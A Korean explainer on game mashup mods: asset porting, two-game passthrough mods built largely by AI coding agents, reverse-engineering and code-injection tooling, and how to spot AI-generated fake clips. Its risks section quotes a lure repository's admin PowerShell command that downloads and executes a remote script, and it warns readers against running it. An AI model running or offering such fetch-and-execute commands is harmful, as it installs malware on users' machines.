게임 섞기 모드는 어떻게 만들어지나

엘든링에 오버워치를, 사이버펑크에 마인크래프트를 섞었다는 영상과 모드에는 서로 다른 세 가지가 섞여 있습니다. 다른 게임의 캐릭터 모델을 뜯어와 입히는 에셋 이식, 두 게임을 동시에 실행해 한쪽은 화면을 그리고 다른 쪽은 게임플레이를 계산하는 패스스루 모드, 그리고 조작할 수 없는 AI 생성 영상입니다. 2026년 9월 말부터 퍼진 것은 두 번째이고, 코드 대부분을 Claude Code 같은 AI 코딩 에이전트가 썼습니다.

조사 방법: 모드 페이지(Nexus는 공개 GraphQL API로 설명문 확인), GitHub 저장소와 설계 문서, 커뮤니티 위키, 기사. 원본이 삭제된 가이드는 커밋 기록이 남은 사본으로 확인했습니다. 영상은 프레임 단위로 분석하지 않았고, 확인한 사실과 추론은 본문에서 구분해 적었습니다.

Q1엘든링 × 오버워치는?

오버워치는 온라인 전용에 안티치트가 있어 ‘두 게임 동시 실행’의 재료가 될 수 없습니다. 확인되는 것은 2022–23년부터 있던 캐릭터 모델 이식(Mercy, D.Va 등)입니다. 화제가 된 ‘둠피스트’ 영상은 원본 모드를 찾지 못했고, ‘Overwatch × Elden Ring 작동’을 내건 GitHub 저장소 두 곳은 악성코드 유포에 흔한 미끼 패턴이었습니다.

Q2사이버펑크 × 마인크래프트는?

바이럴 클립은 재업로드만 돌고 원작자와 배포물을 찾지 못해 확인할 수 없었습니다. 확인되는 것은 사이버펑크에 마인크래프트풍 아이템을 넣은 에셋 모드와, 반대로 마인크래프트 안에 사이버펑크를 재현한 모드입니다.

Q3실제로 플레이되는 매시업은?

EldenCraft(엘든링 × 마인크래프트 Java), SkyCraft(스카이림 × 마인크래프트), ArkWeb(스파이더맨 × 아캄 나이트) 등은 소스나 배포물이 있습니다. 두 게임을 동시에 띄우고, 공유 메모리와 GPU 공유 텍스처로 매 프레임 상태와 픽셀을 주고받습니다.

Q4REA를 썼나?

공개된 매시업 저장소·가이드·기사 어디에도 REA 사용 언급은 없습니다. 쓰인 것은 Claude Code(Opus 5.5)와 Ghidra, 그리고 에이전트가 직접 짠 분석 스크립트입니다. 10월 6일 개정된 가이드는 Ghidra·IDA를 MCP 서버로 연결해 쓰라고 권합니다.

01

세 가지 ‘섞기’

셋을 가르는 기준은 무엇이 두 게임의 경계를 넘는가입니다. 에셋 이식은 파일이 넘어가고 게임은 하나만 돕니다. 패스스루는 두 게임이 동시에 돌면서 상태와 픽셀이 매 프레임 넘어갑니다. AI 영상은 픽셀만 있고 돌아가는 게임이 없습니다.

03

방식 A: 에셋 이식

가장 오래된 방식입니다. 다른 게임에서 모델과 텍스처를 꺼내, 대상 게임의 골격과 파일 형식에 맞춰 바꾼 뒤 기존 아이템 자리에 끼워 넣습니다. 게임은 대상 게임 하나만 실행되므로, 겉모습은 바뀌어도 움직임과 능력은 대상 게임의 것을 그대로 씁니다.

  1. 왜 비율이 깨지나. 엘든링 갑옷은 공유된 플레이어 골격(c0000)의 사본에 스킨되고 공유 애니메이션으로 움직입니다. 그래서 이식하는 사람은 골격을 바꾸지 않고 외부 메시를 엘든링의 뼈 위치에 맞춥니다(추론). 이식 페이지들의 증상이 이와 맞습니다. 레지던트 이블 2의 드레스는 기본 대기 자세에서 늘어나고, 2B의 치마는 몸을 뚫고 나오며, 마스터 치프는 목이 뚫려 몸 전체를 가리는 갑옷 세트로 바꿔 해결했습니다.
  2. 오버워치 모델은 어디서 오나. DataTool(OWLib, MIT 라이선스)이 TACTLib로 블리자드의 CASC 저장소를 읽어 모델·맵·파일을 꺼내고, io_scene_owm 애드온으로 Blender에 가져옵니다. 다만 이렇게 만든 결과를 배포하는 것은 블리자드 EULA와 Nexus 규정에 어긋납니다(08절).
  3. 움직임과 능력은 따로다. 애니메이션은 HKX(Havok), 공격 판정·효과음 같은 이벤트는 TAE에 있고 DSAnimStudio로 편집합니다. 2B 대기 모션 모드의 설명처럼, 플레이어 애니메이션을 바꾸면 침입·소환된 인간형 NPC에도 같이 적용됩니다. 오버워치 영웅의 ‘능력’을 넣으려면 모델과 별개로 이 작업을 해야 합니다.
  4. 가장 단순한 형태. 2016년 폴아웃 4의 “Minecraft FO4”는 파일 166개를 바닐라 에셋 이름 그대로 덮어썼습니다. 크리퍼는 방호복(HazmatSuit), 스티브는 전쟁 전 내의(PrewarUnderarmor), 블록은 창고 바닥(WrhsFloor01.nif) 자리에 들어갔습니다.

04

방식 B: 패스스루

2026년 9월 말 스카이림 × 마인크래프트(SkyCraft)에서 시작된 방식입니다. 제작자는 처음에 이렇게 소개했습니다. “마인크래프트와 스카이림이 동시에 돌고, 둘이 통신하게 하는 모드를 양쪽에 만든다.” 커뮤니티 가이드의 정의는 다음과 같습니다.

“One game (the host) draws the world. The other game supplies the gameplay, like movement, blocks, or combat.” 한 게임(호스트)이 세계를 그리고, 다른 게임이 이동·블록·전투 같은 게임플레이를 댄다.

AI Game Modding Guides · 02-passthrough-mods.md

아래 그림은 SkyCraft 설계 문서(DESIGN.md)를 그대로 옮긴 것입니다. 엘든링 판도 ‘두 게임 동시 실행 + 공유 메모리 + 공유 텍스처 합성’이라는 뼈대는 같지만, 주입 방식과 권한 분배는 프로젝트마다 다릅니다(아래 표). 특히 EldenCraft는 권한을 반대로 나눕니다.

  • 게임 A · 호스트
  • 게임 B · 게임플레이
  • 두 게임 사이의 채널
  • 오가는 데이터 (화살표 방향)
  • AI 에이전트 · 개발

매 프레임 벌어지는 일

  1. 프레임 시작. A가 “BeginFrame N”과 카메라를 보내면 두 게임이 병렬로 그립니다. A는 B의 “frame N ready”를 타임아웃까지 기다리고, 놓치면 N−1 프레임을 다시 씁니다. B의 프레임 상한과 수직동기는 끕니다.
  2. 카메라. B는 렌더 프레임마다 보간된 위치·시점·자세·접지 여부와 뷰 행렬(시점 흔들림 포함), 투영과 FOV를 보냅니다. A는 플레이어 자신의 이동을 끄고, 플레이어와 충돌 캡슐을 그 위치로 옮기며, 카메라를 1인칭으로 고정해 B의 행렬로 덮어씁니다. 세로 FOV는 가로 FOV로 바꾸고, A 캐릭터의 몸과 팔은 숨깁니다.
  3. 입력. A의 입력 장치 관리자에서 원시 입력을 읽어 A의 조작으로는 보내지 않고, Mixin을 통해 B의 키보드·마우스 핸들러로 넘깁니다. B 화면(인벤토리 등)이 열리면 커서를 보이고, A 메뉴가 열리면 입력을 A로 돌리고 B를 멈춥니다.
  4. 렌더와 합성. B는 A의 해상도로 world·hand·GUI 세 레이어를 오프스크린에 그립니다. world 레이어는 A의 깊이 버퍼로 깊이 검사를 하므로 A의 벽이 B의 블록을 가립니다. hand는 A 장면 다음에, GUI는 맨 위에 올립니다. 전달은 OpenGL이면 WGL_NV_DX_interop2로 D3D11 공유 텍스처에, Vulkan이면 VK_KHR_external_memory_win32와 공유 펜스로 합니다.
  5. 세계 공유. A는 플레이어 주변의 충돌 형상(Havok 레이캐스트)과 NPC 위치를 보내고, B는 이를 자기 충돌 질의에 넣어 B의 물리 엔진을 수정 없이 A의 지형 위에서 돌립니다. NPC는 B 안에서 보이지 않는 프록시 엔티티가 되고, B에서 맞힌 타격은 A의 피해 처리 경로로 돌아갑니다.
  6. 좌표 변환. 두 게임은 단위와 축이 다릅니다. SkyCraft에서는 1블록이 스카이림 70유닛이고, 스카이림은 Z축이, 마인크래프트는 Y축이 위쪽입니다. 가이드는 이 변환을 먼저 문서로 적고 단위 테스트하라고 권합니다.
  7. 저장. A의 세이브 안에 save id를 넣어 두고, A가 저장하면 B도 그 id로 자기 상태를 스냅숏합니다. 그래서 불러올 때 두 게임이 함께 되감깁니다.

AI 에이전트와 만드는 순서

Decrypt는 이런 모드가 점점 Claude 기반 에이전트로 만들어진다고 보도했고, 실제 저장소들이 그것을 보여 줍니다. SkyCraft 커밋 7개와 ArkWeb 커밋 4개에는 모두 “Co-Authored-By: Claude Opus 5.5”가 붙어 있고, SkyCraft를 바탕으로 한 Rustify는 “Claude가 코드 대부분을 썼다”고 밝힙니다. 반면 EldenCraft는 페이지와 저장소에 AI나 RE 도구 언급이 없고 커밋 19개에도 AI 표시가 없습니다. 표시가 없다고 해서 쓰지 않았다는 증거는 아닙니다. 아래는 가이드 9장의 제작 순서를 사람·에이전트·게임의 역할로 나눠 그린 것입니다.

에이전트가 맡은 일

  • 설계와 양쪽 코드. 호스트 플러그인(C++·Rust), 게임 B 모드(Java), 공유 메모리 프로토콜, 합성 셰이더까지 씁니다. 가이드: “SkyCraft 프로젝트를 가리키며 같은 것을 원한다고 하면 에이전트가 나머지를 알아낸다.”
  • 필요할 때 리버스 엔지니어링. “올바른 도구로 디컴파일하라”고 하자 에이전트가 맞는 프로세서 모듈과 함께 Ghidra를 설치해 돌렸다는 사례가 있습니다. ArkWeb에서는 게임을 한 번도 실행하지 않고 에이전트가 쓴 pefile·capstone 스크립트로 클래스 16,242개, vtable 16,398개, 문자열 참조와 호출 지점을 덤프해 Havok 충돌 계층을 후킹 지점으로 찾았습니다.
  • 주소 검증. 엘든링 Mac 브리지는 “주소와 구조는 이 빌드를 리버스 엔지니어링해 찾았고 실행 중에 검증했다”고 적고, 쓰기 전에 각 주소의 바이트를 대조합니다.

사람이 맡은 일

  • 조합과 범위 결정. 둘 다 오프라인 게임인지, 호스트에 로더가 있는지 확인합니다. 가이드는 온라인 게임을 “범위 밖”으로 못 박습니다.
  • 실행과 관찰. 두 게임을 띄워 걸어 보고, 무엇이 일어났는지 정확히 말하고, 양쪽 로그를 붙여 넣습니다.
  • 막혔을 때 정리. 같은 프롬프트를 반복하지 말고 STATUS.md를 써서 새 대화로 넘기라고 권합니다. 가장 시간을 잡아먹는 것은 버전 변화, 좌표계(단위·위쪽 축·원점), 두 세이브 시스템, GPU와 프레임 클록 다툼 네 가지입니다.

06

리버스 엔지니어링과 REA

두 방식 모두 밑바닥에는 리버스 엔지니어링이 있습니다. 다만 대부분은 커뮤니티가 수년 전에 해 둔 것이고, 2026년의 매시업에서 새로 하는 RE는 ‘호스트 게임의 어디에 코드를 걸지’ 찾는 일에 집중됩니다.

층위무엇을 알아내나누가 · 무엇으로
파일 형식FLVER·BND4·DCX·TPF·MATBIN·HKX·TAE (FromSoftware) / .archive·CR2W (REDengine)커뮤니티가 해독해 도구로 정리: SoulsFormats, BinderKeys(엘든링 해시 경로 131,031개를 모두 복원), Paramdex, WolvenKit. ividyon의 엘든링 모델링 문서는 Souls 계열에 공식 모딩 지원이 없어 “모든 도구를 리버스 엔지니어들이 맨손으로 긁어모았다”고 설명합니다.
실행 중 구조플레이어·카메라 구조체, 렌더 함수, 피해 처리 함수Ghidra, IDA, x64dbg, Cheat Engine, ReClass. 사이버펑크는 RTTI 덤프(RED4ext)로 클래스 구조를 얻습니다. 매시업에서는 에이전트가 직접 쓴 pefile·capstone 스크립트와 Rust의 pelite·iced-x86도 쓰였습니다.
버전 대응패치마다 바뀌는 주소바이트 패턴(AOB) 서명 검색, 스카이림의 Address Library, 주소마다 기대 바이트 확인. 그래도 대부분 특정 게임 버전에 고정됩니다.
코드 주입게임 안에서 우리 코드를 실행로더(SKSE, me3, ScriptHookV, UE4SS, BepInEx), DLL 프록시(dinput8, winmm), 후킹(MinHook의 트램펄린, 14바이트 절대 점프), ReShade 애드온, 사이버펑크는 redscript의 @wrapMethod·@replaceMethod
렌더 합성다른 게임의 픽셀을 깊이에 맞게 끼워 넣기RenderDoc으로 깊이 형식과 후킹 지점 확인, GPU 공유 텍스처, Present 후킹

그래서 REA를 썼나

확인되지 않음

매시업에 쓰였다는 기록은 없다

가이드 두 판(10월 3일, 6일), universal-modder, 매시업 저장소 12곳의 문서, Nexus 설명문, Decrypt 기사 어디에도 REA(rea-agents)는 나오지 않습니다. SkyCraft·EldenCraft·Mac 브리지·Minecraft-Ring·ArkWeb은 소스 전체를 검색했습니다. 한 기사가 REA를 매시업 사례 옆에 소개하지만, 그것이 쓰였다고 하지는 않습니다.

실제로 쓰인 것

코딩 에이전트 + 범용 RE 도구

Claude Code(Opus 5.5), Ghidra, ILSpy, 에이전트가 쓴 Python 스크립트. 10월 3일판 가이드는 “MCP 서버는 필요 없다”고 했다가 6일판에서 “디컴파일러를 MCP 서버로 조종하는 것이 작업 방식을 바꾼다”며 ghidra-mcp와 ida-mcp를 연결했습니다. universal-modder는 GhidraMCP, ida-pro-mcp, x64dbg·Cheat Engine·Frida·RenderDoc용 MCP를 목록에 올려 둡니다.

REA가 들어갈 자리 (추론)

호스트 실행 파일의 정적 리콘

패스스루 제작에서 REA가 맞는 곳은 ‘로더가 없거나 후킹 지점을 찾아야 할 때’의 정적 분석입니다. Ghidra·IDA로 함수·문자열·참조를 찾고, 결과를 증거 ID로 남겨 패치 뒤 다시 확인할 수 있습니다. ArkWeb에서 에이전트가 직접 짠 스크립트가 하던 일입니다. REA는 다른 게임 RE 저장소(예: rea-agents 6.4.0과 ida-pro-mcp를 함께 고정한 저장소)에서는 쓰인 흔적이 있습니다.

한계 · REA에는 Frida 연동 도구도 있지만 주입 플러그인이나 렌더 합성 코드를 만들어 주지는 않습니다. 그 코드는 에이전트가 직접 씁니다. REA의 DISCLAIMER는 안티치트 우회와 게임 치트 개발을 지원하지 않는다고 밝힙니다. 자세한 동작은 REA × LLM 분석 문서에 있습니다.

07

방식 C: AI 영상 구별법

실제로 조작할 수 없는 ‘매시업’ 영상도 돕니다. 짧은 텍스트→영상 모델(Veo, Kling, Sora), 실시간으로 화면 스타일을 바꾸는 모델(Decart의 Lucy Restyle 2, 2025년의 Mirage), 몇 분 동안 일관된 세계를 만드는 월드 모델(Genie 3, Oasis 3 미리보기)로 만들 수 있습니다. 다만 특정 바이럴 클립이 이 도구로 만들어졌다고 밝힌 출처는 찾지 못했습니다. 언론의 ‘AI slop’은 AI가 만든 영상과 AI로 코딩한 모드를 섞어 부르기도 하니, 기사 표현만으로 판단하지 마세요.

확인해 볼 것

  1. 배포물이 있나. 실제 Releases가 있는 저장소, 다운로드 가능한 모드 페이지, 제작자의 다른 저장소.
  2. 초기 보도의 단서. 첫 기사들이 어떤 유보(hedge)를 달았는지 읽습니다.
  3. 길이와 메타데이터. 생성 클립은 보통 3–10초입니다. 워터마크와 C2PA 메타데이터를 봅니다.
  4. 인터페이스. “실제 게임 UI는 지루할 만큼 일정하고, 생성된 UI는 흐트러진다.” 체력바·미니맵·글자가 프레임마다 바뀌면 의심합니다.
  5. 물리. 접지·충돌·그림자가 어긋나는 장면.

가장 흔한 경우

  • Held Games의 결론은 “가장 흔한 것은 진짜 영상에 거짓 주장이 붙은 경우”입니다. 영상은 진짜인데 ‘공개 예정’ ‘누구나 가능’이 사실이 아닌 식입니다.
  • ‘Minecraft in Elden Ring’ 클립처럼, 한 매체가 가짜라 불렀지만 공개된 같은 구조의 코드가 있어 기술적으로 가능한 경우도 있습니다. 확인되지 않은 것과 가짜로 확인된 것은 다릅니다.
  • ‘작동한다’는 저장소가 실행 파일만 주고 소스가 없거나, 아래의 미끼 패턴을 보이면 그 자체가 위험 신호입니다.

위험과 규칙

미끼 저장소 주의. “Overwatch × Elden Ring ✅ Working”을 내건 GitHub 저장소 두 곳(TileTrackWarehouse/Passthrough-Mod-Forge, TerminusBoulder/Universal-Game-Mashup-Studio)은 계정을 만든 지 2분 만에 저장소를 만들었고, README를 몇 분마다 자동으로 고치며, 관리자 PowerShell에서 원격 스크립트를 내려받아 바로 실행하는 명령(iex (iwr "http://…"))을 쓰라고 합니다. 내려받는 파일은 암호 걸린 93MB zip이고, “실시간 보호를 잠시 끄라”고 안내합니다. 악성코드 유포에 흔한 패턴이므로 실행하지 마세요. 페이로드 자체는 내려받거나 분석하지 않았습니다.

기술적 위험

  • 안티치트와 온라인. 엘든링은 Easy Anti-Cheat가 꺼져 있으면 온라인이 막히고, 모드는 오프라인에서만 씁니다. me3는 기본으로 공식 매치메이킹 연결을 막고, 별도 세이브 파일로 “세이브 손상과 멀티플레이 차단을 피하라”고 권합니다. 보호된 게임 옆에서 디버거를 켜는 것만으로 안티치트가 반응할 수 있습니다. 오버워치 같은 온라인 게임은 모든 가이드가 범위 밖으로 둡니다.
  • 버전 고정. 주소와 구조가 빌드마다 달라 대부분 한 버전에만 맞습니다(EldenCraft는 실행 파일 2.7.1.0만 받음). 게임이 패치되면 깨집니다.
  • 성능. 게임 두 개와 채널이 함께 돕니다. SkyCraft는 JVM 힙을 약 3GB로 잡고, OWCraft는 숨긴 창의 화면 표시를 생략해 25fps를 60fps로 올렸습니다. 프레임 동기가 없으면 끊깁니다.
  • 완성도. 제작자들 스스로 “엉성하지만 작동”이라 말하고, Destructoid는 “간신히 플레이 가능”이라 평했습니다.
  • 에이전트와 브리지 보안. 가이드는 PC 전체 권한을 가진 에이전트의 위험을 경고합니다. 브리지의 공유 메모리는 같은 PC의 다른 프로세스도 읽을 수 있고, 디버거·MCP 서버는 127.0.0.1에만 열어 두라고 권합니다.

권리와 약관

  • 두 게임을 모두 소유. 패스스루는 플레이어마다 두 게임이 필요하고, 저장소에는 코드와 설치 스크립트만 올립니다. 게임 파일은 절대 넣지 않습니다.
  • 블리자드. EULA 1.C.i(2024-03-21 개정)는 플랫폼의 리버스 엔지니어링, 디컴파일, 파생물 제작을 금지합니다. 2016년에는 오버워치 추출 에셋을 쓴 SFM 제작자들이 DMCA 삭제 요청을 받았다고 보고했습니다.
  • Nexus. 권리자 허락 없이 게임 파일이나 이미지 같은 저작권 콘텐츠를 올리는 것을 금지합니다. 오버워치 모델 이식이 남아 있는 것은 단속하지 않아서일 뿐입니다(추론).
  • CD Projekt Red. 팬 콘텐츠 가이드라인은 EULA를 어기지 않는 한 모드를 허용하지만, CDPR 콘텐츠를 다른 게임에 쓰려면 미리 묻고, 다른 게임 제작자의 권리를 침해하지 말고, 유료로 막지 말라고 합니다.
  • 퍼블리셔 반응. 철권 7에 엘든링을 넣은 모드에 철권 디렉터는 “엄청 잘 만든 모드지만 제발 그만해 ㅋㅋ”라고 반응했습니다. Decrypt가 인용한 제작자의 말도 “DMCA 받을 때까지 기다려 봐”였습니다.
